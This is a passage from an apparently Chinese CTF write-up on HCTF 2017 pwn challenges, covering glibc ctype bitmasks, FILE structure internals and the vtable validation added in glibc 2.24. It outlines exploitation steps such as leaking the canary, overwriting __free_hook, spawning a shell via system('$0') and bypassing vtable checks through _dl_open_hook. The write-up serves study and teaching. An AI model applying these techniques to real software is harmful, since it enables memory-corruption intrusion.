&lt;endian.h&gt;</div><div class=\"line\"># <span class=\"keyword\">if</span> __BYTE_ORDER == __BIG_ENDIAN</div><div class=\"line\">#  define _ISbit(bit)\t(<span class=\"number\">1</span> &lt;&lt; (bit))</div><div class=\"line\"># else <span class=\"comment\">/* __BYTE_ORDER == __LITTLE_ENDIAN */</span></div><div class=\"line\">#  define _ISbit(bit)\t((bit) &lt; <span class=\"number\">8</span> ? ((<span class=\"number\">1</span> &lt;&lt; (bit)) &lt;&lt; <span class=\"number\">8</span>) : ((<span class=\"number\">1</span> &lt;&lt; (bit)) &gt;&gt; <span class=\"number\">8</span>))</div><div class=\"line\"># endif</div><div class=\"line\"></div><div class=\"line\">enum</div><div class=\"line\">&#123;</div><div class=\"line\">  _ISupper = _ISbit (<span class=\"number\">0</span>),\t<span class=\"comment\">/* UPPERCASE.  */</span></div><div class=\"line\">  _ISlower = _ISbit (<span class=\"number\">1</span>),\t<span class=\"comment\">/* lowercase.  */</span></div><div class=\"line\">  _ISalpha = _ISbit (<span class=\"number\">2</span>),\t<span class=\"comment\">/* Alphabetic.  */</span></div><div class=\"line\">  _ISdigit = _ISbit (<span class=\"number\">3</span>),\t<span class=\"comment\">/* Numeric.  */</span></div><div class=\"line\">  _ISxdigit = _ISbit (<span class=\"number\">4</span>),\t<span class=\"comment\">/* Hexadecimal numeric.  */</span></div><div class=\"line\">  _ISspace = _ISbit (<span class=\"number\">5</span>),\t<span class=\"comment\">/* Whitespace.  */</span></div><div class=\"line\">  _ISprint = _ISbit (<span class=\"number\">6</span>),\t<span class=\"comment\">/* Printing.  */</span></div><div class=\"line\">  _ISgraph = _ISbit (<span class=\"number\">7</span>),\t<span class=\"comment\">/* Graphical.  */</span></div><div class=\"line\">  _ISblank = _ISbit (<span class=\"number\">8</span>),\t<span class=\"comment\">/* Blank (usually SPC and TAB).  */</span></div><div class=\"line\">  _IScntrl = _ISbit (<span class=\"number\">9</span>),\t<span class=\"comment\">/* Control character.  */</span></div><div class=\"line\">  _ISpunct = _ISbit (<span class=\"number\">10</span>),\t<span class=\"comment\">/* Punctuation.  */</span></div><div class=\"line\">  _ISalnum = _ISbit (<span class=\"number\">11</span>)\t<span class=\"comment\">/* Alphanumeric.  */</span></div><div class=\"line\">&#125;;</div><div class=\"line\">..........</div><div class=\"line\">..........</div><div class=\"line\"># define __isctype(c, type) \\</div><div class=\"line\">  ((*__ctype_b_loc ())[(int) (c)] &amp; (unsigned short int) type)</div></pre></td></tr></table></figure>\n<p>后来我把对应的16进制打印了一下<br><figure class=\"highlight tap\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#include &lt;stdio.h&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;ctype.h&gt;</span></div><div class=\"line\"></div><div class=\"line\">int main()</div><div class=\"line\">&#123;</div><div class=\"line\">\tfor(int i = 0; i &lt; 12; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tprintf(\"%-4d, %04x\\n\", i, _ISbit(i));</div><div class=\"line\">\t\t/*</div><div class=\"line\">\t\t *<span class=\"number\"> 0 </span>  , 0100</div><div class=\"line\">\t\t *<span class=\"number\"> 1 </span>  , 0200</div><div class=\"line\">\t\t *<span class=\"number\"> 2 </span>  , 0400</div><div class=\"line\">\t\t *<span class=\"number\"> 3 </span>  , 0800</div><div class=\"line\">\t\t *<span class=\"number\"> 4 </span>  , 1000</div><div class=\"line\">\t\t *<span class=\"number\"> 5 </span>  , 2000</div><div class=\"line\">\t\t *<span class=\"number\"> 6 </span>  , 4000</div><div class=\"line\">\t\t *<span class=\"number\"> 7 </span>  , 8000</div><div class=\"line\">\t\t *<span class=\"number\"> 8 </span>  , 0001</div><div class=\"line\">\t\t *<span class=\"number\"> 9 </span>  , 0002</div><div class=\"line\">\t\t *<span class=\"number\"> 10 </span> , 0004</div><div class=\"line\">\t\t *<span class=\"number\"> 11 </span> , 0008</div><div class=\"line\">\t\t * /</div><div class=\"line\">\t&#125;</div><div class=\"line\">\treturn 0;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>所以程序中的代码就是检查是否是字母或whitespace。</p>\n<figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">for <span class=\"comment\">( j = 0; j &lt;= 15; ++j )</span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">if</span> <span class=\"comment\">( (*_ctype_b_loc()</span>)[*<span class=\"comment\">(phonePtr_3064[10 * v1] + j)</span>] &amp; <span class=\"number\">0</span>x<span class=\"number\">400</span> )<span class=\"comment\">// Alphabetic</span></div><div class=\"line\">  &#123;</div><div class=\"line\">    puts<span class=\"comment\">(\"I dont trust your phone number!\")</span>;</div><div class=\"line\">    <span class=\"keyword\">goto</span> LABEL_<span class=\"number\">11</span>;</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"keyword\">if</span> <span class=\"comment\">( (*_ctype_b_loc()</span>)[*<span class=\"comment\">(phonePtr_3064[10 * v1] + j)</span>] &amp; <span class=\"number\">0</span>x<span class=\"number\">2000</span> )<span class=\"comment\">// Whitespace</span></div><div class=\"line\">  &#123;</div><div class=\"line\">    puts<span class=\"comment\">(\"I dont trust your phone number!\")</span>;</div><div class=\"line\">    <span class=\"keyword\">goto</span> LABEL_<span class=\"number\">11</span>;</div><div class=\"line\">  &#125;</div></pre></td></tr></table></figure>\n<p>所以先泄露elf基址和canary，然后改<code>__free_hook</code>到一个可以构造栈溢出的地方即可。</p>\n<p><strong>看了一下wp，<code>system(&quot;$0&quot;)</code>也能拿到shell</strong>，还不道为什么，环境变量？</p>","more":"<h3 id=\"babyprintf\"><a href=\"#babyprintf\" class=\"headerlink\" title=\"babyprintf\"></a>babyprintf</h3><p>先简单理解一下<code>FILE</code>结构体，参看了这篇<a href=\"https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique\">slide</a><br><code>File stream</code>结构体可以看作<code>read</code>和<code>write</code>的一个封装，<code>FILE</code>结构体是<code>File stream</code>的一个主要结构体，其内部实现了一个流输入输出的缓冲区，用以减少系统调用的次数。</p>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div></pre></td><td class=\"code\"><pre><div class=\"line\">struct <span class=\"variable\">_IO_FILE</span> &#123;</div><div class=\"line\">  int <span class=\"variable\">_flags</span>;                <span class=\"comment\">/* High-order word is _IO_MAGIC; rest is flags. */</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _IO_file_flags _flags</span></div><div class=\"line\"> </div><div class=\"line\">  <span class=\"comment\">/* The following pointers correspond to the C++ streambuf protocol. */</span></div><div class=\"line\">  <span class=\"comment\">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_read_ptr</span>;        <span class=\"comment\">/* Current read pointer */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_read_end</span>;        <span class=\"comment\">/* End of get area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_read_base</span>;        <span class=\"comment\">/* Start of putback+get area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_write_base</span>;        <span class=\"comment\">/* Start of put area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_write_ptr</span>;        <span class=\"comment\">/* Current put pointer. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_write_end</span>;        <span class=\"comment\">/* End of put area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_buf_base</span>;        <span class=\"comment\">/* Start of reserve area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_buf_end</span>;        <span class=\"comment\">/* End of reserve area. */</span></div><div class=\"line\">  <span class=\"comment\">/* The following fields are used to support backing up and undo. */</span></div><div class=\"line\">  char *<span class=\"variable\">_IO_save_base</span>; <span class=\"comment\">/* Pointer to start of non-current get area. */</span></div><div class=\"line\">  char *<span class=\"variable\">_IO_backup_base</span>;  <span class=\"comment\">/* Pointer to first valid character of backup area */</span></div><div class=\"line\">  char *<span class=\"variable\">_IO_save_end</span>; <span class=\"comment\">/* Pointer to end of non-current get area. */</span></div><div class=\"line\"> </div><div class=\"line\">  struct <span class=\"variable\">_IO_marker</span> *<span class=\"variable\">_markers</span>;</div><div class=\"line\"> </div><div class=\"line\">  struct <span class=\"variable\">_IO_FILE</span> *<span class=\"variable\">_chain</span>;</div><div class=\"line\"> </div><div class=\"line\">  int <span class=\"variable\">_fileno</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> 0</span></div><div class=\"line\">  int <span class=\"variable\">_blksize</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></div><div class=\"line\">  int <span class=\"variable\">_flags2</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\">  <span class=\"variable\">_IO_off_t</span> <span class=\"variable\">_old_offset</span>; <span class=\"comment\">/* This used to be _offset but it's too small.  */</span></div><div class=\"line\"> </div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __HAVE_COLUMN <span class=\"comment\">/* temporary */</span></span></div><div class=\"line\">  <span class=\"comment\">/* 1+column number of pbase(); 0 is unknown. */</span></div><div class=\"line\">  unsigned short <span class=\"variable\">_cur_column</span>;</div><div class=\"line\">  signed char <span class=\"variable\">_vtable_offset</span>;</div><div class=\"line\">  char <span class=\"variable\">_shortbuf</span>[<span class=\"number\">1</span>];</div><div class=\"line\"> </div><div class=\"line\">  <span class=\"comment\">/*  char* _save_gptr;  char* _save_egptr; */</span></div><div class=\"line\"> </div><div class=\"line\">  <span class=\"variable\">_IO_lock_t</span> *<span class=\"variable\">_lock</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> _IO_USE_OLD_IO_FILE</span></div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<p>这里的几个buffer需要注意一下，这里就是我们的<code>FILE_buffer</code>的地址。<br>还有个<code>FILE_plus</code>的结构体，包含了一个虚表</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* We always allocate an extra word following an _IO_FILE.</span></div><div class=\"line\">   This contains a pointer to the function jump table used.</div><div class=\"line\">   This is for compatibility with C++ streambuf; the word can</div><div class=\"line\">   be used to smash to a pointer to a virtual function table. */</div><div class=\"line\"> </div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">_IO_FILE_plus</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  _IO_FILE file;</div><div class=\"line\">  <span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">_IO_jump_t</span></span> *vtable;</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<ul>\n<li><p>Flags</p>\n<ul>\n<li>文件的flag标志位，指示了file流的打开方式</li>\n</ul>\n</li>\n<li><p>_fileno</p>\n<ul>\n<li>文件描述符</li>\n<li>由<code>sys_open</code>函数返回</li>\n</ul>\n</li>\n<li><p>FILE plus</p>\n<ul>\n<li>任何的操作都是通过这个表</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div></pre></td><td class=\"code\"><pre><div class=\"line\">struct _IO_jump_t</div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(size_t, </span>__dummy)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(size_t, </span>__dummy2)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_finish_t, </span>__finish)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_overflow_t, </span>__overflow)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_underflow_t, </span>__underflow)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_underflow_t, </span>__uflow)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_pbackfail_t, </span>__pbackfail)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"comment\">/* showmany */</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_xsputn_t, </span>__xsputn)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_xsgetn_t, </span>__xsgetn)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_seekoff_t, </span>__seekoff)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_seekpos_t, </span>__seekpos)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_setbuf_t, </span>__setbuf)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_sync_t, </span>__sync)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_doallocate_t, </span>__doallocate)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_read_t, </span>__read)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_write_t, </span>__write)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_seek_t, </span>__seek)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_close_t, </span>__close)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_stat_t, </span>__stat)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_showmanyc_t, </span>__showmanyc)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_imbue_t, </span>__imbue)<span class=\"comment\">;</span></div><div class=\"line\"><span class=\"comment\">#if 0</span></div><div class=\"line\">    get_column<span class=\"comment\">;</span></div><div class=\"line\">    set_column<span class=\"comment\">;</span></div><div class=\"line\"><span class=\"comment\">#endif</span></div><div class=\"line\">&#125;<span class=\"comment\">;</span></div></pre></td></tr></table></figure>\n<ul>\n<li><code>struct _IO_FILE *_chain</code><ul>\n<li>所有的<code>FILE</code>结构体都是通过一个单项链表连接起来的</li>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/1.png\" alt=\"\"></li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight haxe\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div></pre></td><td class=\"code\"><pre><div class=\"line\">_IO_FILE *</div><div class=\"line\">__fopen_internal (const char *filename, const char *mode, int is32)</div><div class=\"line\">&#123;</div><div class=\"line\">  struct locked_FILE</div><div class=\"line\">  &#123;</div><div class=\"line\">    struct _IO_FILE_plus fp;</div><div class=\"line\"><span class=\"meta\">#ifdef _IO_MTSAFE_IO</span></div><div class=\"line\">    _IO_lock_t lock;</div><div class=\"line\"><span class=\"meta\">#endif</span></div><div class=\"line\">    struct _IO_wide_data wd;</div><div class=\"line\">  &#125; *<span class=\"keyword\">new</span><span class=\"type\">_f</span> = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));</div><div class=\"line\"> </div><div class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">new</span><span class=\"type\">_f</span> == NULL)</div><div class=\"line\">    <span class=\"keyword\">return</span> NULL;</div><div class=\"line\"><span class=\"meta\">#ifdef _IO_MTSAFE_IO</span></div><div class=\"line\">  <span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;fp.file._lock = &amp;<span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;lock;</div><div class=\"line\"><span class=\"meta\">#endif</span></div><div class=\"line\">  _IO_no_init (&amp;<span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;fp.file, <span class=\"number\">0</span>, <span class=\"number\">0</span>, &amp;<span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;wd, &amp;_IO_wfile_jumps);</div><div class=\"line\">  _IO_JUMPS (&amp;<span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;fp) = &amp;_IO_file_jumps;</div><div class=\"line\">  _IO_new<span class=\"type\">_file_init_internal</span> (&amp;<span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;fp);</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span>  !_IO_UNIFIED_JUMPTABLES</span></div><div class=\"line\">  <span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;fp.vtable = NULL;</div><div class=\"line\"><span class=\"meta\">#endif</span></div><div class=\"line\">  <span class=\"keyword\">if</span> (_IO_file_fopen ((_IO_FILE *) <span class=\"keyword\">new</span><span class=\"type\">_f</span>, filename, mode, is32) != NULL)</div><div class=\"line\">    <span class=\"keyword\">return</span> __fopen_maybe_mmap (&amp;<span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;fp.file);</div><div class=\"line\"> </div><div class=\"line\">  _IO_un_link (&amp;<span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;fp);</div><div class=\"line\">  free (<span class=\"keyword\">new</span><span class=\"type\">_f</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> NULL;</div><div class=\"line\">&#125;</div><div class=\"line\"> </div><div class=\"line\">_IO_FILE *</div><div class=\"line\">_IO_new<span class=\"type\">_fopen</span> (const char *filename, const char *mode)</div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">return</span> __fopen_internal (filename, mode, <span class=\"number\">1</span>);</div><div class=\"line\">&#125;</div><div class=\"line\"> </div><div class=\"line\">strong_alias (_IO_new<span class=\"type\">_fopen</span>, __new<span class=\"type\">_fopen</span>)</div><div class=\"line\">versioned_symbol (libc, _IO_new<span class=\"type\">_fopen</span>, _IO_fopen, GLIBC_2_1);</div><div class=\"line\">versioned_symbol (libc, __new<span class=\"type\">_fopen</span>, fopen, GLIBC_2_1);</div></pre></td></tr></table></figure>\n<ul>\n<li><p><code>fopen</code></p>\n<ul>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/2.png\" alt=\"\"></li>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/3.png\" alt=\"\"></li>\n<li>链入链表头</li>\n</ul>\n</li>\n<li><p>fread</p>\n<ul>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/4.png\" alt=\"\"></li>\n</ul>\n</li>\n<li><p>fwrite</p>\n<ul>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/5.png\" alt=\"\"></li>\n</ul>\n</li>\n<li><p>fclose</p>\n<ul>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/6.png\" alt=\"\"></li>\n</ul>\n</li>\n</ul>\n<p>主要逻辑和fopen差不多，不再细表。</p>\n<p>看一下<code>FILE</code>在2.24之后出现的check</p>\n<p>主要是对vtable的合法性进行检查</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* Perform vtable pointer validation.  If validation fails, terminate</span></div><div class=\"line\">   the process.  */</div><div class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">inline</span> <span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> _<span class=\"function\">IO_jump_t *</span></div><div class=\"line\"><span class=\"title\">IO_validate_vtable</span> <span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> _IO_jump_t *vtable)</span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"comment\">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></div><div class=\"line\">     section.  */</div><div class=\"line\">  <span class=\"keyword\">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</div><div class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *ptr = (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *) vtable;</div><div class=\"line\">  <span class=\"keyword\">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</div><div class=\"line\">  <span class=\"keyword\">if</span> (__glibc_unlikely (offset &gt;= section_length))</div><div class=\"line\">    <span class=\"comment\">/* The vtable pointer is not in the expected section.  Use the</span></div><div class=\"line\">       slow path, which will terminate the process if necessary.  */</div><div class=\"line\">    _IO_vtable_check ();</div><div class=\"line\">  <span class=\"keyword\">return</span> vtable;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>看注释可以得出，如果vtable的指针没有落在<code>__libc_IO_vatbles</code>的节中，那么就会进行<code>_IO_vtable_check</code>的检查</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">void</span> attribute_hidden</div><div class=\"line\">_IO_vtable_check (<span class=\"keyword\">void</span>)</div><div class=\"line\">&#123;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> SHARED</span></div><div class=\"line\">  <span class=\"comment\">/* Honor the compatibility flag.  */</span></div><div class=\"line\">  <span class=\"keyword\">void</span> (*flag) (<span class=\"keyword\">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> PTR_DEMANGLE</span></div><div class=\"line\">  PTR_DEMANGLE (flag);</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\">  <span class=\"keyword\">if</span> (flag == &amp;_IO_vtable_check)</div><div class=\"line\">    <span class=\"keyword\">return</span>;</div><div class=\"line\"> </div><div class=\"line\">  <span class=\"comment\">/* In case this libc copy is in a non-default namespace, we always</span></div><div class=\"line\">     need to accept foreign vtables because there is always a</div><div class=\"line\">     possibility that FILE * objects are passed across the linking</div><div class=\"line\">     boundary.  */</div><div class=\"line\">  &#123;</div><div class=\"line\">    Dl_info di;</div><div class=\"line\">    <span class=\"keyword\">struct</span> link_map *l;</div><div class=\"line\">    <span class=\"keyword\">if</span> (_dl_open_hook != <span class=\"literal\">NULL</span></div><div class=\"line\">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class=\"literal\">NULL</span>) != <span class=\"number\">0</span></div><div class=\"line\">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</div><div class=\"line\">      <span class=\"keyword\">return</span>;</div><div class=\"line\">  &#125;</div><div class=\"line\"> </div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span> <span class=\"comment\">/* !SHARED */</span></span></div><div class=\"line\">  <span class=\"comment\">/* We cannot perform vtable validation in the static dlopen case</span></div><div class=\"line\">     because FILE * handles might be passed back and forth across the</div><div class=\"line\">     boundary.  Therefore, we disable checking in this case.  */</div><div class=\"line\">  <span class=\"keyword\">if</span> (__dlopen != <span class=\"literal\">NULL</span>)</div><div class=\"line\">    <span class=\"keyword\">return</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"> </div><div class=\"line\">  __libc_fatal (<span class=\"string\">\"Fatal error: glibc detected an invalid stdio handle\\n\"</span>);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>主要检查了三种情况，如果这三种情况都不满足的话，那么就说明vtable已经被改变过了。</p>\n<p>我们看到两个地方可以通过检查</p>\n<p><img src=\"/2017/11/13/2017HCTF赛后整理/7.png\" alt=\"\"></p>\n<p>第一个地方因为有指针检查所以很难bypass<br>第二处需要我们overwrite<code>_dl_open_hook</code>，这个指针是一个有三个函数的结构体</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* This code is to support __libc_dlopen from __libc_dlopen'ed shared</span></div><div class=\"line\">   libraries.  We need to ensure the statically linked __libc_dlopen</div><div class=\"line\">   etc. functions are used instead of the dynamically loaded.  */</div><div class=\"line\"><span class=\"keyword\">struct</span> dl_open_hook</div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">void</span> *(*dlopen_mode) (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *name, <span class=\"keyword\">int</span> mode);</div><div 